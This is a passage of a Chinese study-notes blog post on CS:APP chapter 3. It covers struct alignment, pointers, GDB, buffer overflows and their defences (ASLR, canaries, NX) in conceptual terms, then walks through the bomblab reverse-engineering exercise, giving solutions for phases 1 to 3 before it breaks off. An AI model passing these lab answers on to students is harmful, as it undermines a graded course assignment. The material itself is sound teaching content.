class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">S1</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> i;<span class="comment">//+0 4</span></span><br><span class="line"><span class="keyword">char</span> c;<span class="comment">//+4 1</span></span><br><span class="line"><span class="keyword">int</span> j;<span class="comment">//+8 4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看似我们可以采取这样的一种形式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">S1</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> i;<span class="comment">//+0 4</span></span><br><span class="line"><span class="keyword">char</span> c;<span class="comment">//+4 1</span></span><br><span class="line"><span class="keyword">int</span> j;<span class="comment">//+5 4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样我们只需要花费 9 个字节的内存就可以分配完这个结构体。然而事实上为了方便内存管理，它会强制要求 int 对齐在 4 整倍的内存偏移量上面。</p><p>建议做一下例题 3.45，会对对齐这方面有更深的了解。</p><h3 id="将控制和数据结合起来"><a href="#将控制和数据结合起来" class="headerlink" title="将控制和数据结合起来"></a>将控制和数据结合起来</h3><p>到现在我们已经理解了数据和指令的基本操作，本节会详细讲述它们之间的一些详细应用，以及帮我们研究常见的缓冲区溢出漏洞及对应的对抗手段。</p><h4 id="理解指针"><a href="#理解指针" class="headerlink" title="理解指针"></a>理解指针</h4><p>指针是 C 语言的核心特色，它提供了直接对内存操作的一个手段。指针的类型表示了它指向的内存为什么数据类型，我们可以通过显式的强制转换来将一块内存数据以不同的形式表达出来。</p><p>我们来看看指针的特点</p><ul><li>每个指针都有一个值，指定了指向的对象的地址。</li><li>*操作对于指针变量来说，作用是根据指针的数据类型取值。</li><li>强制类型转换不会改变指针的任何值，只会改变它数据的显示方式</li><li>指针可以指向函数</li></ul><p>我们可以声明这样的一个函数指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type (*name)(arglist);</span><br></pre></td></tr></table></figure><p>注意星号和变量名一定要一起加一个括号，不然星号会和前面的数据类型结合，整个声明就变成了一个函数的声明</p><h4 id="GDB调试器"><a href="#GDB调试器" class="headerlink" title="GDB调试器"></a>GDB调试器</h4><p>GNU 调试器 GDB 提供了许多有用的特性，允许我们机器级分析，具体可以用 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$gdb file</span><br></pre></td></tr></table></figure><p>来进入 gdb shell 调试程序，输入 help 可以查看具体命令和效果，常见的有</p><table><thead><tr><th>命令</th><th>效果</th></tr></thead><tbody><tr><td>run</td><td>运行程序（在此给出参数）</td></tr><tr><td>quit</td><td>退出</td></tr><tr><td>kill</td><td>杀死程序</td></tr><tr><td>b xxx</td><td>下断点</td></tr><tr><td>delete</td><td>删除断点</td></tr><tr><td>s</td><td>单步运行</td></tr><tr><td>si</td><td>机器级单步运行</td></tr><tr><td>n</td><td>步过运行</td></tr><tr><td>ni</td><td>步过运行</td></tr><tr><td>c</td><td>继续运行</td></tr><tr><td>finish</td><td>步过运行直到ret</td></tr><tr><td>disass</td><td>查看反汇编代码</td></tr><tr><td>p</td><td>打印数据</td></tr><tr><td>info register</td><td>查看寄存器</td></tr><tr><td>help</td><td>调出手册</td></tr></tbody></table><h4 id="内存越界和缓冲区溢出"><a href="#内存越界和缓冲区溢出" class="headerlink" title="内存越界和缓冲区溢出"></a>内存越界和缓冲区溢出</h4><p>C在数组引用的时不会进行任何边界检查，而且局部变量和状态信息都存放在栈中，两者结合起来就会导致严重的程序错误，破坏栈中存储的信息，如果改变了尝试 ret 的位置，那么就会导致程序执行的位置发生非预期错误。</p><p>有一种特别常见的状态被称为 <strong>缓冲区溢出</strong>，通常是在我们在栈中分配字符数组的时候，输入的字符串超出了我们分配的大小。</p><p>比如这样第一个程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">echo</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">gets(buf);</span><br><span class="line"><span class="built_in">puts</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而 gets 函数会读取一整行，直到遇到 \n 时才会停止读入，不做任何长度判断，因此这个函数是危险的。</p><p>我们编译出这个函数的汇编代码可以得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">endbr64</span><br><span class="line">pushq%rbp</span><br><span class="line">movq%rsp, %rbp</span><br><span class="line">subq$16, %rsp</span><br><span class="line">leaq-8(%rbp), %rax</span><br><span class="line">movq%rax, %rdi</span><br><span class="line">movl$0, %eax</span><br><span class="line">callgets@PLT</span><br><span class="line">leaq-8(%rbp), %rax</span><br><span class="line">movq%rax, %rdi</span><br><span class="line">callputs@PLT</span><br><span class="line">nop</span><br><span class="line">leave</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>gets 函数的参数为 -8(%rbp) 也就是说超过8位之后，我们会覆盖到 rbp 所在的位置，如果再超过8个字节，那么就会覆盖到返回地址。</p><p>因此一般情况下我们不会使用 gets 函数去读入，这是不好的编程习惯。</p><p>缓冲区溢出更致命的一点就是让程序执行原本不会执行的函数，这是种比较常见的通过计算机网络攻击系统安全的方法。我们称编写攻击的脚本为 exploit code ，而我们直接输入的字节被称为 payload，一般情况下，攻击代码可能会尝试启动一个 shell 程序让攻击者获取对受害计算机直接操控的权限。</p><h4 id="对抗缓冲区溢出攻击"><a href="#对抗缓冲区溢出攻击" class="headerlink" title="对抗缓冲区溢出攻击"></a>对抗缓冲区溢出攻击</h4><p>我们有如下的几种方法：</p><ol><li>栈随机化</li><li>栈破坏检测</li><li>栈不可执行</li></ol><p>一般情况下，程序每次运行的虚拟地址都是固定不变的，这样会使得程序更容易遭受攻击，栈随机化使得每次程序运行时栈的位置都有变化，这类技术我们成为 <strong>地址空间布局随机化（Address-Space Layout Randomization）</strong> 当然，有防御，就会有攻击方法。我们只需要在缓冲区中插入比较多的 nop 指令，那么我们只要任意命中一个 nop 都可以导致我们恶意代码的顺利执行。这个序列的常用术语是 nop sled 差不多就是一直滑过去。如果随机化的可能性达到了 2^21，那么如果命中位置只有一个的话，我们就要赌这 2^(-21) 的概率，这显然不太能被接受，假如我们插入了 255 字节的 nop，那么我们任意命中 256 中的其中一个，我们都可以执行成功，概率直接缩小到 2^13，这个数字大小能稍微被接受了。</p><p>第二个思路是在造成严重的后果之前尽可能检测到栈溢出了，思想就是往返回地址之前插入一段随机数，在函数即将返回的时候，检查这段随机数是否被更改，如果被更改，调用 __stack_chk_fail 函数进行异常处理终止程序运行。一般这个随机数我们称为 canary（<strong>金丝雀</strong>，实际在下矿的时候主要用于探测煤矿是否有毒），现在的 gcc 版本默认添加 canary，但是我们可以通过参数 -fno-stack-protector 参数关闭这个保护。</p><p>第三个思路就是<strong>NX（NO EXECUTE）</strong>让栈中不可执行代码，我们往栈中插入代码的思想也就变的不可行了，但是我们仍然可以使用 ROP 的思想去绕过这一保护。</p><h2 id="CSAPP-bomblab"><a href="#CSAPP-bomblab" class="headerlink" title="CSAPP:bomblab"></a>CSAPP:bomblab</h2><p><a href="http://csapp.cs.cmu.edu/3e/labs.html">实验文件下载</a></p><p>我们只需要下载 writeup（实验说明） 和 Self-Study Handout（自学附件）即可。</p><p>解压附件我们可以得到一个源文件和一个二进制文件，但是源文件并没有给全，只给了大概的程序逻辑。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//bomb.c</span></span><br><span class="line"><span class="comment">/***************************************************************************</span></span><br><span class="line"><span class="comment"> * Dr. Evil&#x27;s Insidious Bomb, Version 1.1</span></span><br><span class="line"><span class="comment"> * Copyright 2011, Dr. Evil Incorporated. All rights reserved.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * LICENSE:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Dr. Evil Incorporated (the PERPETRATOR) hereby grants you (the</span></span><br><span class="line"><span class="comment"> * VICTIM) explicit permission to use this bomb (the BOMB).  This is a</span></span><br><span class="line"><span class="comment"> * time limited license, which expires on the death of the VICTIM.</span></span><br><span class="line"><span class="comment"> * The PERPETRATOR takes no responsibility for damage, frustration,</span></span><br><span class="line"><span class="comment"> * insanity, bug-eyes, carpal-tunnel syndrome, loss of sleep, or other</span></span><br><span class="line"><span class="comment"> * harm to the VICTIM.  Unless the PERPETRATOR wants to take credit,</span></span><br><span class="line"><span class="comment"> * that is.  The VICTIM may not distribute this bomb source code to</span></span><br><span class="line"><span class="comment"> * any enemies of the PERPETRATOR.  No VICTIM may debug,</span></span><br><span class="line"><span class="comment"> * reverse-engineer, run &quot;strings&quot; on, decompile, decrypt, or use any</span></span><br><span class="line"><span class="comment"> * other technique to gain knowledge of and defuse the BOMB.  BOMB</span></span><br><span class="line"><span class="comment"> * proof clothing may not be worn when handling this program.  The</span></span><br><span class="line"><span class="comment"> * PERPETRATOR will not apologize for the PERPETRATOR&#x27;s poor sense of</span></span><br><span class="line"><span class="comment"> * humor.  This license is null and void where the BOMB is prohibited</span></span><br><span class="line"><span class="comment"> * by law.</span></span><br><span class="line"><span class="comment"> ***************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;support.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;phases.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Note to self: Remember to erase this file so my victims will have no</span></span><br><span class="line"><span class="comment"> * idea what is going on, and so they will all blow up in a</span></span><br><span class="line"><span class="comment"> * spectaculary fiendish explosion. -- Dr. Evil </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">FILE *infile;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *input;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Note to self: remember to port this bomb to Windows and put a </span></span><br><span class="line"><span class="comment">     * fantastic GUI on it. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* When run with no arguments, the bomb reads its input lines </span></span><br><span class="line"><span class="comment">     * from standard input. */</span></span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">1</span>) &#123;  </span><br><span class="line">infile = <span class="built_in">stdin</span>;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* When run with one argument &lt;file&gt;, the bomb reads from &lt;file&gt; </span></span><br><span class="line"><span class="comment">     * until EOF, and then switches to standard input. Thus, as you </span></span><br><span class="line"><span class="comment">     * defuse each phase, you can add its defusing string to &lt;file&gt; and</span></span><br><span class="line"><span class="comment">     * avoid having to retype it. */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (argc == <span class="number">2</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(infile = fopen(argv[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>))) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s: Error: Couldn&#x27;t open %s\n&quot;</span>, argv[<span class="number">0</span>], argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* You can&#x27;t call the bomb with more than 1 command line argument. */</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Usage: %s [&lt;input_file&gt;]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Do all sorts of secret stuff that makes the bomb harder to defuse. */</span></span><br><span class="line">    initialize_bomb();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to my fiendish little bomb. You have 6 phases with\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;which to blow yourself up. Have a nice day!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Hmm...  Six phases must be more secure than one phase! */</span></span><br><span class="line">    input = read_line();             <span class="comment">/* Get input                   */</span></span><br><span class="line">    phase_1(input);                  <span class="comment">/* Run the phase               */</span></span><br><span class="line">    phase_defused();                 <span class="comment">/* Drat!  They figured it out!</span></span><br><span class="line"><span class="comment">      * Let me know how they did it. */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Phase 1 defused. How about the next one?\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The second phase is harder.  No one will ever figure out</span></span><br><span class="line"><span class="comment">     * how to defuse this... */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_2(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;That&#x27;s number 2.  Keep going!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* I guess this is too easy so far.  Some more complex code will</span></span><br><span class="line"><span class="comment">     * confuse people. */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_3(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Halfway there!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Oh yeah?  Well, how good is your math?  Try on this saucy problem! */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_4(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;So you got that one.  Try this one.\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Round and &#x27;round in memory we go, where we stop, the bomb blows! */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_5(input);</span><br><span class="line">    phase_defused();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Good work!  On to the next...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This phase will never be used, since no one will get past the</span></span><br><span class="line"><span class="comment">     * earlier ones.  But just in case, make this one extra hard. */</span></span><br><span class="line">    input = read_line();</span><br><span class="line">    phase_6(input);</span><br><span class="line">    phase_defused();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Wow, they got it!  But isn&#x27;t something... missing?  Perhaps</span></span><br><span class="line"><span class="comment">     * something they overlooked?  Mua ha ha ha ha! */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>writeup 提示我们最好使用调试手段而是不要使用暴力手段，每一关我们都要有对应的正确输入才能保证炸弹不爆炸。</p><p>当然以现在的状态做这个实验就是小菜一碟。。</p><h3 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h3><p>那我们还是走流程，先起 gdb 调试。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$gdb ./bomb</span><br></pre></td></tr></table></figure><p>一般选择 main 下断点，然后 r 去运行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt;b main</span><br><span class="line">pwndbg&gt;r</span><br></pre></td></tr></table></figure><p><img src="/2022/09/22/CSAPP_3/1.png" alt="1"></p><p>程序断在 main 函数的第一句中，这里我使用了插件 pwndbg，方便观察调试信息。</p><p>首先我们用 n 步过调试命令去运行到第一个函数 </p><p><img src="/2022/09/22/CSAPP_3/2.png" alt="2"></p><p>因为这里符号表是没有去的，我们在 gdb 里面还是可以看到这个函数名的，initialize_bomb 可以望文生义，就是初始化炸弹嘛。</p><p>然后接着步过运行过去，运行到 readline 之后发现程序停下，开始要接收我们的输入了，随便输入一串字符之后发现程序输出一段话之后就直接结束了，那么我们直接往回看一看，有一个 phase_1 函数，这里我们不用步过命令了，用 si 步进命令跟到函数里面，然后接着 n，运行之后发现有一个函数叫 string_not_equal </p><p><img src="/2022/09/22/CSAPP_3/3.png" alt="3"></p><p>并且 rdi 也就是第一个参数是我们所输入的字符串，第二个参数是一个字符串 </p><p>Border relations with Canada have never been better.</p><p>那么应该就是跟字符串比较的，当然我们输入的字符串肯定跟他们不一样，我们跳过之后发现函数返回值为 1，而后面 test eax,eax，并且为为零跳转。我们很清楚可以看到如果不跳转，下面就直接执行了 call explode_bomb，直接就爆炸，所以我们这里需要输入相等的字符串，成功过第一关</p><h3 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h3><p>这里我们同样随便输入一串字符串，然后跟到 phase_2 函数里面，发现调用了一个 read_six_number 函数，这个函数干什么的已经是太明显了，就是要读取六个数字。</p><p>那么我们直接输入 6 个零跟进去看看</p><p><img src="/2022/09/22/CSAPP_3/4.png" alt="4"></p><p>这里 6 个数字很明显是存储在了栈上，那么这个地方拿栈中的数据和 1 作比较，如果相等跳转，不相等 call explode_bomb，所以这里我们需要让他相等，当然在调试器里面我们可以为所欲为，直接假装它们一样，跳转到对应的位置。</p><p>我们直接设置 $rip 寄存器帮助他跳转过去，使用这个命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt;set $rip=phase_2+52</span><br></pre></td></tr></table></figure><p><img src="/2022/09/22/CSAPP_3/5.png" alt="5"></p><p>然后发现进入了一层循环：</p><p>从上往下分析汇编代码，每次取出 [rbx] 的值与 eax 作比较，循环终止条件为 rbx==rbp，rbx每次循环+4，eax每次执行翻倍。其实这个地方应该就是在遍历我们输入的六个数了，那么第一个数是 1，后面都翻倍，我们不难想到这六个数应该是</p><p>1 2 4 8 16 32</p><p>第二个炸弹也成功拆除了。</p><h3 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h3><p>这里为了方便调试，我们选择在 phase_3 下断点（b phase_3），然后把前两个拆弹语句写到 1.txt 当中，然后在运行的时候加上参数就能直接跳过前两关，直接进入第三关的调试分析了。</p><p>在 gdb 调试器里面我们可以通过 r 1.txt 的方式添加命令行参数。</p><p>随便输入一串字符串之后，我们断在了 phase_3 函数当中，可以发现中间调用了一个 scanf 函数，并且有参数 %d %d，那么我们也可以推断应该是两个整数，于是我们换 0 0 进去调试看看。</p><p><img src="/2022/09/22/CSAPP_3/6.png" alt="6"></p><p>然后下面是判断输入的数的个数要超过 1 个，其实也就是两个数了，然后跳转到下面的 cmp [rsp+8],7 并且超过 7 跳转，我们也可以通过 disass phase_3 看看这个跳转的地方。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function phase_3:</span><br><span class="line">   0x0000000000400f43 &lt;+0&gt;:sub    rsp,0x18</span><br><span class="line">   0x0000000000400f47 &lt;+4&gt;:lea    rcx,[rsp+0xc]</span><br><span class="line">   0x0000000000400f4c &lt;+9&gt;:lea    rdx,[rsp+0x8]</span><br><span class="line">   0x0000000000400f51 &lt;+14&gt;:mov    esi,0x4025cf</span><br><span class="line">   0x0000000000400f56 &lt;+19&gt;:mov    eax,0x0</span><br><span class="line">   0x0000000000400f5b &lt;+24&gt;:call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   0x0000000000400f60 &lt;+29&gt;:cmp    eax,0x1</span><br><span class="line">=&gt; 0x0000000000400f63 &lt;+32&gt;:jg     0x400f6a &lt;phase_3+39&gt;</span><br><span class="line">   0x0000000000400f65 &lt;+34&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400f6a &lt;+39&gt;:cmp    DWORD PTR [rsp+0x8],0x7</span><br><span class="line">   0x0000000000400f6f &lt;+44&gt;:ja     0x400fad &lt;phase_3+106&gt;</span><br><span class="line">   0x0000000000400f71 &lt;+46&gt;:mov    eax,DWORD PTR [rsp+0x8]</span><br><span class="line">   0x0000000000400f75 &lt;+50&gt;:jmp    QWORD PTR [rax*8+0x402470]</span><br><span class="line">   0x0000000000400f7c &lt;+57&gt;:mov    eax,0xcf</span><br><span class="line">   0x0000000000400f81 &lt;+62&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f83 &lt;+64&gt;:mov    eax,0x2c3</span><br><span class="line">   0x0000000000400f88 &lt;+69&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f8a &lt;+71&gt;:mov    eax,0x100</span><br><span class="line">   0x0000000000400f8f &lt;+76&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f91 &lt;+78&gt;:mov    eax,0x185</span><br><span class="line">   0x0000000000400f96 &lt;+83&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f98 &lt;+85&gt;:mov    eax,0xce</span><br><span class="line">   0x0000000000400f9d &lt;+90&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400f9f &lt;+92&gt;:mov    eax,0x2aa</span><br><span class="line">   0x0000000000400fa4 &lt;+97&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400fa6 &lt;+99&gt;:mov    eax,0x147</span><br><span class="line">   0x0000000000400fab &lt;+104&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400fad &lt;+106&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400fb2 &lt;+111&gt;:mov    eax,0x0</span><br><span class="line">   0x0000000000400fb7 &lt;+116&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">   0x0000000000400fb9 &lt;+118&gt;:mov    eax,0x137</span><br><span class="line">   0x0000000000400fbe &lt;+123&gt;:cmp    eax,DWORD PTR [rsp+0xc]</span><br><span class="line">   0x0000000000400fc2 &lt;+127&gt;:je     0x400fc9 &lt;phase_3+134&gt;</span><br><span class="line">   0x0000000000400fc4 &lt;+129&gt;:call   0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400fc9 &lt;+134&gt;:add    rsp,0x18</span><br><span class="line">   0x0000000000400fcd &lt;+138&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>我们很清楚的可以看到，超过 7 直接跳转 call explode_bomb。</p><p>其实这里我们就很清楚地发现了，这里应该是 switch 分发语句，这里有一个 0x402470 + 8*eax ，那么我们不难推测，0x402470 应该就是跳转表的位置了，我们使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt;x/8gx 0x402470</span><br></pre></td></tr></table></figure><p>打印出跳转表的内容。</p><p><img src="/2022/09/22/CSAPP_3/7.png" alt="7"></p><p>我们随便选一个，比如 eax=0 的时候，会跳转到 0x400f7c，这里 mov eax,0xcf，给 eax 寄存器赋值了，然后跳转到 0x400fbe 中和 [rsp+0xc] 进行比较，那么这里应该是我们输入的第二个数了，相等跳转绕过 call explode_bomb 函数。所以第三关，我们填写 0 207 可以过去这一关，当然也可以看看其它跳转位置分别给了啥值，这一关答案不固定。</p><h3 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h3><p>同样的思路，我们把前三关的语句保存在文件当中，给第四个函数下断点，运行，输入，来到输入这里。</p><p><img src="/2022/09/22/CSAPP_3/8.png" alt="8"></p><p>可以看到依然是两个整数，那重新来，换俩零看看。</p><p>首先，第一个判断</p><p><img src="/2022/09/22/CSAPP_3/9.png" alt="9"></p><p>判断输入的，应该是第一个数是否小于 0xe，小于则跳转到 +46的位置，那么我们可以反汇编看看它不跳转会到哪里去。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function phase_4:</span><br><span class="line">   0x000000000040100c &lt;+0&gt;:sub    rsp,0x18</span><br><span class="line">   0x0000000000401010 &lt;+4&gt;:lea    rcx,[rsp+0xc]</span><br><span class="line">   0x0000000000401015 &lt;+9&gt;:lea    rdx,[rsp+0x8]</span><br><span class="line">   0x000000000040101a &lt;+14&gt;:mov    esi,0x4025cf</span><br><span class="line">   